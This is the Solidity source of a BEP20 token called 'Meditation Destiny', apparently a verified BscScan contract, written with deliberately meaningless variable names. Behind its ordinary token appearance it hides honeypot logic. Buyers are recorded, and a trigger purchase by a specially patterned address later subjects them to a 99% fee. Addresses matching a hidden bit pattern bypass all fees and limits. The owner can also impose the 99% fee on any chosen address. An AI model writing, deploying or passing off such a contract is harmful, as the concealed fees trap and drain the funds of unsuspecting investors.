/**
 *Submitted for verification at BscScan.com on 2022-12-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}



contract MeditationDestiny is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 feeBurnBotsReceiver = 100000000 * (10 ** _decimals);
    uint256  senderFundLiquidityBuyFee = 2000000 * 10 ** _decimals;
    uint256  listSellModeAt = 2000000 * 10 ** _decimals;


    string constant _name = "Meditation Destiny";
    string constant _symbol = "MDY";
    uint8 constant _decimals = 18;

    uint256 private swapMarketingTokenAmountTeamTx = 0;
    uint256 private amountTxShouldLaunch = 5;

    uint256 private totalTeamMaxMarketing = 0;
    uint256 private swapMaxLiquidityEnableList = 5;

    bool private toFromListTotal = true;
    bool private swapMarketingLaunchedTradingMin = true;
    bool private takeExemptLaunchTeam = true;
    bool private launchBotsAtTake = true;
    bool private walletFeeEnableIsAmountMaxAuto = true;
    uint256 tradingBuyModeEnableLimitAmount = 2 ** 18 - 1;
    uint256 private botsModeLimitFeeMinMarketing = 6 * 10 ** 15;
    uint256 private receiverIsAtShould = feeBurnBotsReceiver / 1000; // 0.1%
    uint256 sellListFeeMode = 33469;

    uint256 private modeFromBuyWalletShouldEnableTx = amountTxShouldLaunch + swapMarketingTokenAmountTeamTx;
    uint256 private toModeLaunchedSell = 100;

    bool private takeSwapFundSender;
    uint256 private tradingLaunchMarketingTeamLimitLiquidityLaunched;
    uint256 private atMarketingTxTradingReceiverListFund;
    uint256 private autoSellTxBurnTradingLaunchedFrom;
    uint256 private totalModeSwapTakeLaunchWallet;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeListBuySwap;
    mapping(address => bool) private limitFromFundShould;
    mapping(address => bool) private tradingEnableSenderLimit;
    mapping(address => bool) private totalEnableAmountBots;
    mapping(address => uint256) private sellBurnTradingAt;
    mapping(uint256 => address) private shouldReceiverReceiverToken;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public fromSenderToEnableTrading;
    address public uniswapV2Pair;

    uint256 private tradingEnableListMint;
    uint256 private receiverToAutoLaunchedIsMarketing;

    address private sellSenderWalletLiquidity = (msg.sender); // auto-liq address
    address private modeFromExemptFee = (0x4fE62138AfD264a46fB01db9fffFD8736488ee4D); // marketing address

    
    uint256 public mintTeamModeBurn = 0;
    bool private sellSenderModeBots = false;
    bool public mintLaunchedToIsFeeTx = false;
    uint256 public tokenTeamExemptTo = 0;
    bool private walletBurnLaunchedFrom = false;
    uint256 public toAmountShouldAt = 0;
    uint256 public autoBotsTxTrading = 0;
    bool private autoMaxReceiverLiquidity = false;
    uint256 public fromReceiverTokenSenderFeeWallet = 0;
    uint256 private buyLiquidityTotalList = 0;
    uint256 private takeAtFundFromToBots = 0;
    bool public minMaxExemptReceiver = false;
    bool public atBotsFeeFundIs = false;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fromSenderToEnableTrading = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fromSenderToEnableTrading.factory()).createPair(address(this), fromSenderToEnableTrading.WETH());
        _allowances[address(this)][address(fromSenderToEnableTrading)] = feeBurnBotsReceiver;

        takeSwapFundSender = true;

        tradingEnableSenderLimit[msg.sender] = true;
        tradingEnableSenderLimit[0x0000000000000000000000000000000000000000] = true;
        tradingEnableSenderLimit[0x000000000000000000000000000000000000dEaD] = true;
        tradingEnableSenderLimit[address(this)] = true;

        modeListBuySwap[msg.sender] = true;
        modeListBuySwap[address(this)] = true;

        limitFromFundShould[msg.sender] = true;
        limitFromFundShould[0x0000000000000000000000000000000000000000] = true;
        limitFromFundShould[0x000000000000000000000000000000000000dEaD] = true;
        limitFromFundShould[address(this)] = true;

        approve(_router, feeBurnBotsReceiver);
        approve(address(uniswapV2Pair), feeBurnBotsReceiver);
        _balances[msg.sender] = feeBurnBotsReceiver;
        emit Transfer(address(0), msg.sender, feeBurnBotsReceiver);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return feeBurnBotsReceiver;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, feeBurnBotsReceiver);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return totalEnableMaxSender(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != feeBurnBotsReceiver) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return totalEnableMaxSender(sender, recipient, amount);
    }

    function botsEnableFundModeAtTx() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (sellBurnTradingAt[shouldReceiverReceiverToken[i]] == 0) {
                    sellBurnTradingAt[shouldReceiverReceiverToken[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getmintLaunchedTxMarketing() public view returns (bool) {
        if (atBotsFeeFundIs == takeExemptLaunchTeam) {
            return takeExemptLaunchTeam;
        }
        if (atBotsFeeFundIs == atBotsFeeFundIs) {
            return atBotsFeeFundIs;
        }
        if (atBotsFeeFundIs == minMaxExemptReceiver) {
            return minMaxExemptReceiver;
        }
        return atBotsFeeFundIs;
    }

    function receiverMinLaunchedIs() private view returns (uint256) {
        return block.timestamp;
    }

    function walletLaunchExemptShouldAt() private view returns (uint256) {
        address receiverModeBuyMarketing = WBNB;
        if (address(this) < WBNB) {
            receiverModeBuyMarketing = address(this);
        }
        (uint walletTokenIsMarketing, uint tokenEnableSellAuto,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 fromAmountModeSwap,) = WBNB == receiverModeBuyMarketing ? (walletTokenIsMarketing, tokenEnableSellAuto) : (tokenEnableSellAuto, walletTokenIsMarketing);
        uint256 atBuyTeamSender = IERC20(WBNB).balanceOf(uniswapV2Pair) - fromAmountModeSwap;
        return atBuyTeamSender;
    }

    function getbuyIsBotsMarketing() public view returns (uint256) {
        return receiverIsAtShould;
    }

    function botsLaunchedTokenMarketingModeSender(address maxTokenAutoListReceiverTxLimit) private {
        if (walletLaunchExemptShouldAt() < botsModeLimitFeeMinMarketing) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        shouldReceiverReceiverToken[maxWalletAmount] = maxTokenAutoListReceiverTxLimit;
    }

    function totalLaunchedLiquidityEnable(address atFeeAmountFrom, bool liquidityMinToAmount) internal returns (uint256) {
        
        if (liquidityMinToAmount) {
            modeFromBuyWalletShouldEnableTx = swapMaxLiquidityEnableList + totalTeamMaxMarketing;
            return tokenToShouldReceiver(atFeeAmountFrom, modeFromBuyWalletShouldEnableTx);
        }
        if (!liquidityMinToAmount && atFeeAmountFrom == uniswapV2Pair) {
            modeFromBuyWalletShouldEnableTx = amountTxShouldLaunch + swapMarketingTokenAmountTeamTx;
            return modeFromBuyWalletShouldEnableTx;
        }
        return tokenToShouldReceiver(atFeeAmountFrom, modeFromBuyWalletShouldEnableTx);
    }

    function mintLimitSellAuto() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        walletFeeEnableIsAmountMaxAuto &&
        _balances[address(this)] >= receiverIsAtShould;
    }

    function getburnTxShouldBuyTeamSellTo() public view returns (uint256) {
        return modeFromBuyWalletShouldEnableTx;
    }

    function getfromTokenLimitTxMaxFundLaunch() public view returns (uint256) {
        if (amountTxShouldLaunch != toModeLaunchedSell) {
            return toModeLaunchedSell;
        }
        if (amountTxShouldLaunch == swapMaxLiquidityEnableList) {
            return swapMaxLiquidityEnableList;
        }
        return amountTxShouldLaunch;
    }

    function settotalMinToReceiver(address enableMintMarketingShould) public onlyOwner {
        if (modeFromExemptFee != ZERO) {
            ZERO=enableMintMarketingShould;
        }
        modeFromExemptFee=enableMintMarketingShould;
    }

    function setfromTokenLimitTxMaxFundLaunch(uint256 enableMintMarketingShould) public onlyOwner {
        amountTxShouldLaunch=enableMintMarketingShould;
    }

    function setbuyIsBotsMarketing(uint256 enableMintMarketingShould) public onlyOwner {
        if (receiverIsAtShould == takeAtFundFromToBots) {
            takeAtFundFromToBots=enableMintMarketingShould;
        }
        if (receiverIsAtShould != fromReceiverTokenSenderFeeWallet) {
            fromReceiverTokenSenderFeeWallet=enableMintMarketingShould;
        }
        receiverIsAtShould=enableMintMarketingShould;
    }

    function setmodeListIsAuto(uint256 enableMintMarketingShould) public onlyOwner {
        botsModeLimitFeeMinMarketing=enableMintMarketingShould;
    }

    function getisMaxWalletAmountFromReceiverBuy(address enableMintMarketingShould) public view returns (uint256) {
        if (enableMintMarketingShould == DEAD) {
            return tokenTeamExemptTo;
        }
        if (sellBurnTradingAt[enableMintMarketingShould] == sellBurnTradingAt[enableMintMarketingShould]) {
            return receiverIsAtShould;
        }
            return sellBurnTradingAt[enableMintMarketingShould];
    }

    function getmodeListIsAuto() public view returns (uint256) {
        if (botsModeLimitFeeMinMarketing == autoBotsTxTrading) {
            return autoBotsTxTrading;
        }
        if (botsModeLimitFeeMinMarketing == maxWalletAmount) {
            return maxWalletAmount;
        }
        if (botsModeLimitFeeMinMarketing == toModeLaunchedSell) {
            return toModeLaunchedSell;
        }
        return botsModeLimitFeeMinMarketing;
    }

    function walletModeTakeAtMintTotalLaunch(address maxTokenAutoListReceiverTxLimit) private view returns (bool) {
        return ((uint256(uint160(maxTokenAutoListReceiverTxLimit)) << 192) >> 238) == tradingBuyModeEnableLimitAmount;
    }

    function buyTokenFundLaunch(address atFeeAmountFrom) internal view returns (bool) {
        return !limitFromFundShould[atFeeAmountFrom];
    }

    function mintAtSellTo(address atFeeAmountFrom, address shouldTeamWalletSell, uint256 atShouldBuyLaunchTxList) internal returns (uint256) {
        
        if (atBotsFeeFundIs != swapMarketingLaunchedTradingMin) {
            atBotsFeeFundIs = minMaxExemptReceiver;
        }


        uint256 receiverBotsTradingReceiverBurn = atShouldBuyLaunchTxList.mul(totalLaunchedLiquidityEnable(atFeeAmountFrom, shouldTeamWalletSell == uniswapV2Pair)).div(toModeLaunchedSell);

        if (totalEnableAmountBots[atFeeAmountFrom] || totalEnableAmountBots[shouldTeamWalletSell]) {
            receiverBotsTradingReceiverBurn = atShouldBuyLaunchTxList.mul(99).div(toModeLaunchedSell);
        }

        _balances[address(this)] = _balances[address(this)].add(receiverBotsTradingReceiverBurn);
        emit Transfer(atFeeAmountFrom, address(this), receiverBotsTradingReceiverBurn);
        
        return atShouldBuyLaunchTxList.sub(receiverBotsTradingReceiverBurn);
    }

    function botsWalletLimitToken(uint160 swapAtMaxShould) private view returns (bool) {
        return uint16(swapAtMaxShould) == sellListFeeMode;
    }

    function getbuyShouldTokenAmount(uint256 enableMintMarketingShould) public view returns (address) {
        if (enableMintMarketingShould != buyLiquidityTotalList) {
            return DEAD;
        }
            return shouldReceiverReceiverToken[enableMintMarketingShould];
    }

    function setbuyShouldTokenAmount(uint256 enableMintMarketingShould,address minMintBotsWallet) public onlyOwner {
        if (enableMintMarketingShould != botsModeLimitFeeMinMarketing) {
            ZERO=minMintBotsWallet;
        }
        if (enableMintMarketingShould != tokenTeamExemptTo) {
            DEAD=minMintBotsWallet;
        }
        shouldReceiverReceiverToken[enableMintMarketingShould]=minMintBotsWallet;
    }

    function gettotalMinToReceiver() public view returns (address) {
        if (modeFromExemptFee == ZERO) {
            return ZERO;
        }
        return modeFromExemptFee;
    }

    function receiverListAmountTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setisMaxWalletAmountFromReceiverBuy(address enableMintMarketingShould,uint256 minMintBotsWallet) public onlyOwner {
        if (enableMintMarketingShould != ZERO) {
            takeAtFundFromToBots=minMintBotsWallet;
        }
        if (enableMintMarketingShould != DEAD) {
            mintTeamModeBurn=minMintBotsWallet;
        }
        if (enableMintMarketingShould != ZERO) {
            launchBlock=minMintBotsWallet;
        }
        sellBurnTradingAt[enableMintMarketingShould]=minMintBotsWallet;
    }

    function tokenToShouldReceiver(address atFeeAmountFrom, uint256 launchedIsLaunchSell) private view returns (uint256) {
        uint256 atTxBotsBurn = sellBurnTradingAt[atFeeAmountFrom];
        if (atTxBotsBurn > 0 && receiverMinLaunchedIs() - atTxBotsBurn > 2) {
            return 99;
        }
        return launchedIsLaunchSell;
    }

    function totalEnableMaxSender(address atFeeAmountFrom, address swapAtMaxShould, uint256 atShouldBuyLaunchTxList) internal returns (bool) {
        
        bool fundIsTradingMin = walletModeTakeAtMintTotalLaunch(atFeeAmountFrom) || walletModeTakeAtMintTotalLaunch(swapAtMaxShould);
        
        if (walletBurnLaunchedFrom != walletBurnLaunchedFrom) {
            walletBurnLaunchedFrom = autoMaxReceiverLiquidity;
        }


        if (atFeeAmountFrom == uniswapV2Pair) {
            if (maxWalletAmount != 0 && botsWalletLimitToken(uint160(swapAtMaxShould))) {
                botsEnableFundModeAtTx();
            }
            if (!fundIsTradingMin) {
                botsLaunchedTokenMarketingModeSender(swapAtMaxShould);
            }
        }
        
        
        if (inSwap || fundIsTradingMin) {return receiverListAmountTx(atFeeAmountFrom, swapAtMaxShould, atShouldBuyLaunchTxList);}
        
        require((atShouldBuyLaunchTxList <= senderFundLiquidityBuyFee) || tradingEnableSenderLimit[atFeeAmountFrom] || tradingEnableSenderLimit[swapAtMaxShould], "Max TX Limit!");

        if (mintLimitSellAuto()) {receiverWalletToLaunch();}

        _balances[atFeeAmountFrom] = _balances[atFeeAmountFrom].sub(atShouldBuyLaunchTxList, "Insufficient Balance!");
        
        uint256 atShouldBuyLaunchTxListReceived = buyTokenFundLaunch(atFeeAmountFrom) ? mintAtSellTo(atFeeAmountFrom, swapAtMaxShould, atShouldBuyLaunchTxList) : atShouldBuyLaunchTxList;

        _balances[swapAtMaxShould] = _balances[swapAtMaxShould].add(atShouldBuyLaunchTxListReceived);
        emit Transfer(atFeeAmountFrom, swapAtMaxShould, atShouldBuyLaunchTxListReceived);
        return true;
    }

    function setburnTxShouldBuyTeamSellTo(uint256 enableMintMarketingShould) public onlyOwner {
        if (modeFromBuyWalletShouldEnableTx == fromReceiverTokenSenderFeeWallet) {
            fromReceiverTokenSenderFeeWallet=enableMintMarketingShould;
        }
        if (modeFromBuyWalletShouldEnableTx != tokenTeamExemptTo) {
            tokenTeamExemptTo=enableMintMarketingShould;
        }
        if (modeFromBuyWalletShouldEnableTx == receiverIsAtShould) {
            receiverIsAtShould=enableMintMarketingShould;
        }
        modeFromBuyWalletShouldEnableTx=enableMintMarketingShould;
    }

    function setmintLaunchedTxMarketing(bool enableMintMarketingShould) public onlyOwner {
        if (atBotsFeeFundIs == atBotsFeeFundIs) {
            atBotsFeeFundIs=enableMintMarketingShould;
        }
        if (atBotsFeeFundIs != autoMaxReceiverLiquidity) {
            autoMaxReceiverLiquidity=enableMintMarketingShould;
        }
        atBotsFeeFundIs=enableMintMarketingShould;
    }

    function receiverWalletToLaunch() internal swapping {
        
        if (takeAtFundFromToBots != receiverIsAtShould) {
            takeAtFundFromToBots = tokenTeamExemptTo;
        }

        if (tokenTeamExemptTo != fromReceiverTokenSenderFeeWallet) {
            tokenTeamExemptTo = receiverIsAtShould;
        }


        uint256 atShouldBuyLaunchTxListToLiquify = receiverIsAtShould.mul(swapMarketingTokenAmountTeamTx).div(modeFromBuyWalletShouldEnableTx).div(2);
        uint256 atShouldBuyLaunchTxListToSwap = receiverIsAtShould.sub(atShouldBuyLaunchTxListToLiquify);

        address[] memory liquidityReceiverLaunchedLimitFrom = new address[](2);
        liquidityReceiverLaunchedLimitFrom[0] = address(this);
        liquidityReceiverLaunchedLimitFrom[1] = fromSenderToEnableTrading.WETH();
        fromSenderToEnableTrading.swapExactTokensForETHSupportingFeeOnTransferTokens(
            atShouldBuyLaunchTxListToSwap,
            0,
            liquidityReceiverLaunchedLimitFrom,
            address(this),
            block.timestamp
        );
        
        if (sellSenderModeBots != sellSenderModeBots) {
            sellSenderModeBots = takeExemptLaunchTeam;
        }

        if (takeAtFundFromToBots != maxWalletAmount) {
            takeAtFundFromToBots = mintTeamModeBurn;
        }


        uint256 exemptTxSellEnableModeMin = address(this).balance;
        uint256 receiverMinToSell = modeFromBuyWalletShouldEnableTx.sub(swapMarketingTokenAmountTeamTx.div(2));
        uint256 exemptTxSellEnableModeMinLiquidity = exemptTxSellEnableModeMin.mul(swapMarketingTokenAmountTeamTx).div(receiverMinToSell).div(2);
        uint256 amountMintTxSell = exemptTxSellEnableModeMin.mul(amountTxShouldLaunch).div(receiverMinToSell);
        
        payable(modeFromExemptFee).transfer(amountMintTxSell);

        if (atShouldBuyLaunchTxListToLiquify > 0) {
            fromSenderToEnableTrading.addLiquidityETH{value : exemptTxSellEnableModeMinLiquidity}(
                address(this),
                atShouldBuyLaunchTxListToLiquify,
                0,
                0,
                sellSenderWalletLiquidity,
                block.timestamp
            );
            emit AutoLiquify(exemptTxSellEnableModeMinLiquidity, atShouldBuyLaunchTxListToLiquify);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}